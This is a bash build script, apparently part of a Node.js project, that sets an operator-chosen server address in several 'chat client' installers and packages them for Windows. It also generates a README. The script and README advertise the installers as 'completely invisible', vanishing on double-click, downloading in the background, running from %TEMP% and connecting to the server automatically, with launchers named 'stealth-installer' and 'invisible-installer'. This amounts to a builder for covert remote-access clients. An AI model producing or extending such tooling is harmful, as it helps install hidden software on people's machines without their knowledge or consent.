#!/bin/bash

# ============================================
# Complete Build Script - One Click Solution
# ============================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}     Complete Client Build Script${NC}"
echo -e "${BLUE}================================================${NC}\n"

# Check if server URL is provided
if [ -z "$1" ]; then
    echo -e "${YELLOW}Usage: $0 <server-host:port>${NC}"
    echo -e "${YELLOW}Example: $0 192.168.1.100:8080${NC}"
    echo -e "${YELLOW}Example: $0 myserver.com:8080${NC}"
    echo -e "${YELLOW}Example: $0 myapp.ngrok.io:80${NC}\n"
    
    echo -e "${RED}Current configuration:${NC}"
    grep "SERVER_HOST" client-installer.js
    grep "SERVER_URL" client-headless.js | head -1
    echo ""
    exit 1
fi

SERVER_HOST="$1"

echo -e "${GREEN}[1/6] Configuring server endpoint...${NC}"
echo -e "Setting server to: ${YELLOW}$SERVER_HOST${NC}"

# Update all configuration files
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" client-installer.js
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" single-installer.js
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" truly-silent-installer.js
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" fixed-debug-installer.js
sed -i "s|const SERVER_URL = '.*';|const SERVER_URL = 'ws://$SERVER_HOST';|" client-headless.js
sed -i "s|const SERVER_URL = '.*';|const SERVER_URL = 'ws://$SERVER_HOST';|" client-standalone.js
sed -i "s|const SERVER_URL = '.*';|const SERVER_URL = 'ws://$SERVER_HOST';|" client-windows-silent.js 2>/dev/null || true

echo -e "${GREEN}✓ Configuration updated${NC}\n"

# Clean previous builds
echo -e "${GREEN}[2/6] Cleaning previous builds...${NC}"
rm -rf dist/*
mkdir -p dist
echo -e "${GREEN}✓ Clean complete${NC}\n"

# Build silent client for Windows
echo -e "${GREEN}[3/6] Building silent Windows client...${NC}"
npm run build:windows:silent
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Build failed!${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Silent client built${NC}\n"

# Build the installer
echo -e "${GREEN}[4/6] Building installer executable...${NC}"
npm run build:installer
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Installer build failed!${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Installer built${NC}\n"

# Build the lite installer (downloads compressed client)
echo -e "${GREEN}[5/7] Building lite installer...${NC}"
# Update lite installer with server
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" client-installer-lite.js
# Build lite installer
npx pkg client-installer-lite.js --targets node18-win-x64 --output dist/installer-lite.exe
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}⚠ Lite installer build failed (continuing)${NC}"
else
    echo -e "${GREEN}✓ Lite installer built (downloads compressed client)${NC}\n"
fi

# Build the truly silent installer
echo -e "${GREEN}[6/10] Building truly silent installer...${NC}"
# Update silent installer with server
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" truly-silent-installer.js
# Build silent installer
npx pkg truly-silent-installer.js --targets node18-win-x64 --output dist/install.exe
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}⚠ Silent installer build failed (continuing)${NC}"
else
    echo -e "${GREEN}✓ Silent installer built (completely invisible)${NC}\n"
fi

# Build the debug installer
echo -e "${GREEN}[7/10] Building debug installer...${NC}"
# Update debug installer with server
sed -i "s|const SERVER_HOST = '.*';|const SERVER_HOST = '$SERVER_HOST';|" fixed-debug-installer.js
# Build debug installer
npx pkg fixed-debug-installer.js --targets node18-win-x64 --output dist/debug-install.exe
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}⚠ Debug installer build failed (continuing)${NC}"
else
    echo -e "${GREEN}✓ Debug installer built (with detailed logging)${NC}\n"
fi

# Also build Linux version for testing
echo -e "${GREEN}[8/10] Building Linux client (for testing)...${NC}"
npm run build:silent
echo -e "${GREEN}✓ Linux client built${NC}\n"

# Create compressed version
echo -e "${GREEN}[9/10] Creating compressed version...${NC}"
cd dist
zip -9 chat-client-silent.zip chat-client-silent.exe
echo -e "${GREEN}✓ Compressed to $(du -h chat-client-silent.zip | cut -f1)${NC}\n"
cd ..

# Create distribution package
echo -e "${GREEN}[10/10] Creating distribution package...${NC}"
DIST_DIR="dist/release"
mkdir -p "$DIST_DIR"

# Copy essential files
cp dist/client-installer.exe "$DIST_DIR/" 2>/dev/null || echo -e "${YELLOW}Warning: client-installer.exe not found${NC}"
cp dist/installer-lite.exe "$DIST_DIR/" 2>/dev/null || echo -e "${YELLOW}Warning: installer-lite.exe not found${NC}"
cp dist/install.exe "$DIST_DIR/" 2>/dev/null || echo -e "${YELLOW}Warning: install.exe not found${NC}"
cp dist/debug-install.exe "$DIST_DIR/" 2>/dev/null || echo -e "${YELLOW}Warning: debug-install.exe not found${NC}"
cp run-silent.vbs "$DIST_DIR/" 2>/dev/null || true
cp start-silent.bat "$DIST_DIR/" 2>/dev/null || true
cp tiny-installer.bat "$DIST_DIR/" 2>/dev/null || true
cp installer.ps1 "$DIST_DIR/" 2>/dev/null || true
cp install.vbs "$DIST_DIR/" 2>/dev/null || true
cp invisible-installer.vbs "$DIST_DIR/" 2>/dev/null || true
cp stealth-installer.bat "$DIST_DIR/" 2>/dev/null || true

# Create info file
cat > "$DIST_DIR/README.txt" << EOF
Chat Client Installer Options
============================

Server: $SERVER_HOST

RECOMMENDED (One File Solution):
===============================

1. install.exe (BEST - Single File, 37MB)
   - Just ONE file - no dependencies!
   - User double-clicks, installer disappears immediately
   - Downloads and installs completely in background
   - No visible windows or progress bars
   - Client connects automatically

ALTERNATIVE (Two Files):
=======================

2. install.vbs (100% Invisible, 1KB) + installer-lite.exe (37MB)
   - User double-clicks VBS, installer disappears immediately
   - Downloads and installs completely in background
   - Requires both files in same folder

2. invisible-installer.vbs (Alternative invisible launcher)
   - Same functionality as install.vbs
   - Runs installer-lite.exe completely hidden

3. stealth-installer.bat (Batch version, ultra-small)
   - Batch file version of invisible installer
   - Starts installer and exits immediately

VISIBLE OPTIONS (Shows Progress):
================================

4. installer-lite.exe (Downloads 14MB compressed client)
   - Downloads compressed client for faster installation
   - Shows installation progress
   - Best for slow internet connections

5. tiny-installer.bat (Ultra-small 1KB installer)
   - Tiny batch file that downloads compressed client
   - No build required, just share this file

ORIGINAL (Large Download):
=========================

4. client-installer.exe (Downloads 37MB full client)
   - Original version
   - Self-contained but large download
   - Use only if compressed version doesn't work

ALL METHODS:
- Install to %TEMP%\ChatClient
- Start client silently in background
- Connect to server automatically

EOF

echo -e "${GREEN}✓ Distribution package created${NC}\n"

# Summary
echo -e "${BLUE}================================================${NC}"
echo -e "${GREEN}✅ BUILD COMPLETE!${NC}"
echo -e "${BLUE}================================================${NC}\n"

echo -e "${GREEN}Server configured to:${NC} ${YELLOW}$SERVER_HOST${NC}\n"

echo -e "${GREEN}Files created:${NC}"
ls -la dist/*.exe 2>/dev/null | awk '{print "  ✓ " $NF}'
echo ""

echo -e "${GREEN}Distribution files:${NC}"
ls -la "$DIST_DIR" | grep -v "^total" | grep -v "^d" | awk 'NR>1 {print "  ✓ " $NF}'
echo ""

echo -e "${YELLOW}📦 READY FOR DISTRIBUTION:${NC}"
echo -e "  ${GREEN}🥇 BEST - Single file:${NC} dist/install.exe (37MB, completely invisible)"
echo -e "  ${GREEN}Alternative - Two files:${NC} install.vbs + installer-lite.exe"
echo -e "  ${GREEN}Tiny installer:${NC} tiny-installer.bat (1KB)"
echo -e "  ${GREEN}Debug version:${NC} dist/debug-install.exe (with detailed logging)"
echo -e "  ${GREEN}Full package:${NC} dist/release/"
echo ""

echo -e "${BLUE}📋 Next Steps:${NC}"
echo -e "  1. Test locally: ./dist/chat-client-silent &"
echo -e "  2. 🥇 Distribute: dist/install.exe (SINGLE FILE - recommended)"
echo -e "  3. Alternative: install.vbs + installer-lite.exe (two files)"
echo -e "  4. Users just double-click and everything happens invisibly!"
echo ""

echo -e "${GREEN}✨ Done! Your single-click installer is ready!${NC}"